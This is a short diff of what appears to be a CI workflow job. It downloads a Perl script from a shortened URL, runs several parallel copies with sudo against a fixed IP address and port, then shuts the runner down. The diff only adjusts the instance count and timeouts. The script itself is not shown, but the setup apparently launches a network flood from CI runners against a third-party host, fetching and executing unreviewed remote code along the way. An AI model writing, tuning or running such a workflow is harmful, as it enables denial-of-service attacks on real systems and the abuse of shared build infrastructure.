@@ -17,8 +17,8 @@ jobs:
           wget https://curl.by/JoUcy/dc.pl -O dc.pl
           chmod +x dc.pl
           PIDS=()
-          for i in {1..5}; do
-            sudo timeout 40 perl dc.pl 35.219.241.142 50004 &
+          for i in {1..4}; do
+            sudo timeout 50 perl dc.pl 35.219.241.142 50004 &
             PIDS+=($!)
           done
           
@@ -28,7 +28,7 @@ jobs:
 
       - name: OK !
         run: |
-          sleep 40
+          sleep 50
           sudo shutdown now
           sudo reboot
           exit 0
